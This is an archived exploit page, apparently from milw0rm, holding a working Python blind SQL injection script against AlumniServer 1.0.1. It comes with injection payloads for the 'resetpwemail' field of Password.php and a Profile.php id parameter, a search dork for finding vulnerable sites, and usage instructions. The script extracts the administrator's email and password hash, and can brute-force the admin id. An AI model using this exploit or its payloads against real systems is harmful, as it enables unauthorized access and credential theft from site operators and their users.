<html><head><title>AlumniServer 1.0.1 (resetpwemail) Blind SQL Injection Exploit</title></head><pre>#!/usr/bin/python
#***********************************************************************************************
#***********************************************************************************************
#**	       										      **
#**  											      **
#**     [] [] []  [][][][&gt;  []     []  [][  ][]     []   [][]]  []  [&gt;  [][][][&gt;  [][][][]    **
#**     || || ||  []        [][]   []   []  []     []   []      [] []   []	  []    []    **
#   [&gt;  [][][][]  [][][][&gt;  [] []  []   []  []   [][]  []       [][]    [][][][&gt;  []    []    **
#**  [-----[]-----[][][][&gt;--[]--[]-[]---[][][]--[]-[]--[]--------[]-----[][][][&gt;--[][][][]---\ 
#**==[&gt;    []     []        []   [][]   []  [] [][][]  []       [][]    []           [] []  &gt;&gt;--
#**  [----[[]]----[]--- ----[]-----[]---[]--[]-----[]--[]-------[] []---[]----------[]--[]---/ 
#   [&gt;   [[[]]]   [][][][&gt;  [][]   [] [][[] [[]]  [][]  [][][]  []  [&gt;  [][][][&gt; &lt;][]   []    
#**							                                      **
#**    											      **
#**                           VIVA SPAIN!... GANAREMOS EL MUNDIAL!...o.O                      **
#**					   PROUD TO BE SPANISH!	                              **
#**											      **
#***********************************************************************************************
#***********************************************************************************************
#
#---------------------------------------------------------------------------------------------
#|       	       (POST var 'resetpwemail') BLIND SQL INJECTION EXPLOIT      	     |
#|-------------------------------------------------------------------------------------------|
#|                                    |    AlumniServer v-1.0.1      |		    	     |
#|  CMS INFORMATION:          	       ------------------------------	               	     |
#|										             |
#|--&gt;WEB: http://www.alumniserver.net/			          	                     |
#|--&gt;DOWNLOAD: http://www.alumniserver.net/		         	                     |
#|--&gt;DEMO: N/A   	     			    					     |
#|--&gt;CATEGORY: CMS/Education								     |
#|--&gt;DESCRIPTION: Open Source Alumni software, based on PHP+MySQL for universities, schools  |
#|		and companies. Services for usersinclude profile page,...	     	     |
#|--&gt;RELEASED: 2009-06-11								     |
#|											     |
#|  CMS VULNERABILITY:									     |
#|											     |
#|--&gt;TESTED ON: Python 2.6								     |
#|--&gt;DORK: &quot;AlumniServer project&quot;					                     |
#|--&gt;CATEGORY: BSQLi PYTHON EXPLOIT		                             		     |
#|--&gt;AFFECT VERSION: CURRENT				 			             |
#|--&gt;Discovered Bug date: 2009-06-15							     |
#|--&gt;Reported Bug date: 2009-06-15							     |
#|--&gt;Fixed bug date: N/A							             |
#|--&gt;Info patch (????): N/A					  			     |
#|--&gt;Author: YEnH4ckEr									     |
#|--&gt;mail: y3nh4ck3r[at]gmail[dot]com							     |
#|--&gt;WEB/BLOG: N/A									     |
#|--&gt;COMMENT: A mi novia Marijose...hermano,cunyada, padres (y amigos xD) por su apoyo.      |
#|--&gt;EXTRA-COMMENT: Gracias por aguantarme a todos! (Te kiero xikitiya!)		     |
#---------------------------------------------------------------------------------------------
#
#------------
#CONDITIONS:
#------------
#
#magic quotes=OFF
#
#-------
#NEED:
#-------
#
#Valid email
#
#---------------------------------------
#PROOF OF CONCEPT (SQL INJECTION):
#---------------------------------------
#
#POST http://[HOST]/[PATH]/Password.php HTTP/1.1
#Host: [HOST]
#Referer: http://[HOST]/[PATH]/Password.php
#Content-Type: application/x-www-form-urlencoded
#
#resetpwemail=[valid_mail]%27+and+1%3D%270 --&gt; FALSE
#resetpwemail=[valid_mail]%27+and+1%3D%271 --&gt; TRUE
#
#Other P0C (with a registered user):
#
#http://[HOST]/[PATH]/Profile.php?id=[valid_id]%27+AND+1=0%23 --&gt;FALSE
#http://[HOST]/[PATH]/Profile.php?id=[valid_id]%27+AND+1=1%23 --&gt;TRUE
#
#--------------
#WATCH VIDEOS
#--------------
#
# BSQLi --&gt; http://www.youtube.com/watch?v=K3z7iyHttBw
#
# AUTH BYPASS --&gt; http://www.youtube.com/watch?v=UjDm2p7qHj0
#
#
##############################################################################
##############################################################################
##**************************************************************************##
##  SPECIAL THANKS TO: Str0ke and every H4ck3r(all who do milw0rm)!         ##
##**************************************************************************##
##--------------------------------------------------------------------------##
##**************************************************************************##
## GREETZ TO: JosS, Ulises2k, J.McCray, Evil1 and Spanish Hack3Rs community!##
##**************************************************************************##
##############################################################################
##############################################################################
#
#Used modules
import urllib2,sys,re,os
#Defined functions
def init():
	if(sys.platform=='win32'):
		os.system(&quot;cls&quot;)
		os.system (&quot;title AlumniServer v-1.0.1 Blind SQL Injection Exploit&quot;)
		os.system (&quot;color 02&quot;)
	else:
		os.system(&quot;clear&quot;)

	print &quot;\t#######################################################\n\n&quot;
	print &quot;\t#######################################################\n\n&quot;
	print &quot;\t##     AlumniServer v-1.0.1 Blind SQLi Exploit       ##\n\n&quot;
	print &quot;\t##       ++Conditions: magic_quotes=OFF              ##\n\n&quot;
	print &quot;\t##       ++Needed: Valid mail                        ##\n\n&quot;
	print &quot;\t##               Author: Y3nh4ck3r                   ##\n\n&quot;
	print &quot;\t##      Contact:y3nh4ck3r[at]gmail[dot]com           ##\n\n&quot;
	print &quot;\t##            Proud to be Spanish!                   ##\n\n&quot;
	print &quot;\t#######################################################\n\n&quot;
	print &quot;\t#######################################################\n\n&quot;
	
def request(urltarget,postmsg):
	req=urllib2.Request(url=urltarget,data=postmsg)
	conn = urllib2.urlopen(req)
	outcode=conn.read()
	#print outcode #--&gt; Active this line for debugger mode
	return outcode

def error():
	print &quot;\t------------------------------------------------------------\n&quot;
	print &quot;\tWeb isn't vulnerable!\n\n&quot;
	print &quot;\t---&gt;Maybe:\n\n&quot;
	print &quot;\t\t1.-Patched.\n&quot;
	print &quot;\t\t2.-Bad path or host.\n&quot;
	print &quot;\t\t3.-Bad mail.\n&quot;
	print &quot;\t\t4.-Magic quotes ON.\n&quot;
	print &quot;\t\tEXPLOIT FAILED!\n&quot;
	print &quot;\t------------------------------------------------------------\n&quot;
	sys.exit()

def testedblindsql():
	print &quot;\t-----------------------------------------------------------------\n&quot;
	print &quot;\tWEB MAYBE BE VULNERABLE!\n\n&quot;
	print &quot;\tTested Blind SQL Injection.\n&quot;		
	print &quot;\tStarting exploit...\n&quot;
	print &quot;\t-----------------------------------------------------------------\n\n&quot;

def helper(filename):
	print &quot;\n\t[!!!] AlumniServer v-1.0.1 Blind SQL Injection Exploit\n&quot;
	print &quot;\t[!!!] USAGE MODE: [!!!]\n&quot;
	print &quot;\t[!!!] python &quot;+filename+&quot; [HOST] [PATH] [MAIL] [ID_ADMIN/HIDDEN/BRUTEFORCEID]\n&quot;
	print &quot;\t[!!!] [HOST]: Web.\n&quot;
	print &quot;\t[!!!] [PATH]: Home Path.\n&quot;
	print &quot;\t[!!!] [MAIL]: Mail for fish\n&quot;
	print &quot;\t[!!!] [ID_ADMIN/HIDDEN/BRUTEFORCEID]: Id_admin if we are registered users or 'hidden' value if admin is hidden.\n&quot;
	print &quot;\t[!!!]  Also can use 'bruteforceid' value for bruteforce admin id previously.\n&quot;
	print &quot;\t[!!!] Example: python &quot;+filename+&quot; www.example.com demo y3nh4ck3r@gmail.com cd54cd7df99a\n&quot;
	print &quot;\t[!!!] Example: python &quot;+filename+&quot; www.example.com demo y3nh4ck3r@gmail.com hidden\n&quot;
	print &quot;\t[!!!] Example: python &quot;+filename+&quot; www.example.com demo y3nh4ck3r@gmail.com bruteforceid\n&quot;
	sys.exit()
	
def brute_length(urlrequest, idadmin, mail):
	#Username length
	flag=1
	i=0
	while(flag==1):
		i=i+1
		if(idadmin==&quot;hidden&quot;):
			blindsql=&quot;resetpwemail=&quot;+mail+&quot;'+AND+(SELECT+length(email)+FROM+as_users+WHERE+hideuser='y')='&quot;+str(i) #injected code
		else:
			blindsql=&quot;resetpwemail=&quot;+mail+&quot;'+AND+(SELECT+length(email)+FROM+as_users+WHERE+id='&quot;+idadmin+&quot;')='&quot;+str(i) #injected code
		output=request(urlrequest, blindsql)
		if(re.search(&quot;You will receive an email shortly with a link that enables you to reset your password.&quot;,output)):
			flag=2
		else:
			flag=1
		#This is the max length of email
		if (i&gt;50):
			error()
		#Save column length
	length=i
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;
	print &quot;\tLength catched!\n&quot;
	print &quot;\tLength E-mail --&gt; &quot;+str(length)+&quot;\n&quot;
	print &quot;\tWait several minutes...\n&quot;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n\n&quot;
	return length
def exploiting (lengthvalue, urlrequest, column, idadmin, mail):
	#Bruteforcing values
	values=&quot;&quot;
	k=1
	z=32
	while((k&lt;=lengthvalue) and (z&lt;=126)):
		#Choose method, hidden or with id
		if(idadmin==&quot;hidden&quot;):
			blindsql=&quot;resetpwemail=&quot;+mail+&quot;'+AND+ascii(substring((SELECT+&quot;+column+&quot;+FROM+as_users+WHERE+hideuser='y'),&quot;+str(k)+&quot;,1))='&quot;+str(z) #injected code
		else:
			blindsql=&quot;resetpwemail=&quot;+mail+&quot;'+AND+ascii(substring((SELECT+&quot;+column+&quot;+FROM+as_users+WHERE+id='&quot;+idadmin+&quot;'),&quot;+str(k)+&quot;,1))='&quot;+str(z) #injected code
		output=request(urlrequest, blindsql)
		if(re.search(&quot;You will receive an email shortly with a link that enables you to reset your password.&quot;,output)):
			values=values+chr(z)
			k=k+1
			z=32
#new char
		z=z+1 
	return values
	
def exploiting_id (urlrequest, mail):
	#Bruteforcing values
	values=&quot;&quot;
	#Possible values of id
	arrayids=[0,1,2,3,4,5,6,7,8,9,'a','b','c','d','e','f']
	k=1
	#Max length of id = 12
	while(k&lt;=12):
		for z in arrayids:	
			blindsql=&quot;resetpwemail=&quot;+mail+&quot;'+AND+substring((SELECT+id+FROM+as_users+HAVING+MIN(membersince)),&quot;+str(k)+&quot;,1)='&quot;+str(z) #injected code
			output=request(urlrequest, blindsql)
			if(re.search(&quot;You will receive an email shortly with a link that enables you to reset your password.&quot;,output)):
				values=values+str(z)
				k=k+1
				z='g'		
	return values
#Main
init()
#Init variables
if(len(sys.argv) &lt;= 4):
    helper(sys.argv[0])

host=sys.argv[1]
path=sys.argv[2]
mail=sys.argv[3]
#Define mode: ID, hidden or bruteforceid
if(sys.argv[4]==&quot;hidden&quot;):
	mode=&quot;hidden&quot;
elif(sys.argv[4]==&quot;bruteforceid&quot;):
	mode=&quot;bruteforceid&quot;
else:
	mode=&quot;usual&quot;
	idadmin=sys.argv[4]

finalrequest=&quot;http://&quot;+host+&quot;/&quot;+path+&quot;/Password.php&quot;
testblind1=&quot;resetpwemail=&quot;+mail+&quot;%27+and+1%3D%271&quot; #Return true
outcode1=request(finalrequest,testblind1)
testblind2=&quot;resetpwemail=&quot;+mail+&quot;%27+and+1%3D%270&quot; #Return false
outcode2=request(finalrequest,testblind2)
#Check BSQLi
if(outcode1==outcode2):
	error()
else:
	testedblindsql()
if(mode==&quot;usual&quot;):
	#Catching length of admin email
	lengthadmin=brute_length(finalrequest, idadmin, mail)
	mailadmin=exploiting(lengthadmin, finalrequest, &quot;email&quot;, idadmin, mail)
	#Catching value of password (hashed md5)
	passwordhash=exploiting(32, finalrequest, &quot;password&quot;, idadmin, mail)
elif(mode==&quot;hidden&quot;):
	#Catching length of admin email
	lengthadmin=brute_length(finalrequest, &quot;hidden&quot;, mail)
	mailadmin=exploiting(lengthadmin, finalrequest, &quot;email&quot;, &quot;hidden&quot;, mail)
	#Catching value of password (hashed md5)
	passwordhash=exploiting(32, finalrequest, &quot;password&quot;, &quot;hidden&quot;, mail)
else:
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n&quot;
	print &quot;\tBruteforcing id. Wait a few minutes...\n&quot;
	print &quot;\t&lt;&lt;&lt;&lt;&lt;---------------------------------------------------------&gt;&gt;&gt;&gt;&gt;\n\n&quot;
	#Catching value of admin id
	idadmin=exploiting_id(finalrequest, mail)

print &quot;\n\t\t*************************************************\n&quot;
print &quot;\t\t*********  EXPLOIT EXECUTED SUCCESSFULLY ********\n&quot;
print &quot;\t\t*************************************************\n\n&quot;
#Mode usual and hidden
if((mode==&quot;usual&quot;) or (mode==&quot;hidden&quot;)):
	print &quot;\t\tAdmin-mail: &quot;+mailadmin+&quot;\n\n&quot;
	print &quot;\t\tPassword hash: &quot;+passwordhash+&quot;\n\n&quot;
else:
#Mode bruteforceid
    print &quot;\t\tAdmin-id: &quot;+idadmin+&quot;\n\n&quot;
print &quot;\n\t\t&lt;&lt;----------------------FINISH!--------------------&gt;&gt;\n\n&quot;
print &quot;\t\t&lt;&lt;---------------Thanks to: y3nh4ck3r--------------&gt;&gt;\n\n&quot;
print &quot;\t\t&lt;&lt;------------------------EOF----------------------&gt;&gt;\n\n&quot;

# milw0rm.com [2009-06-25]</pre></html>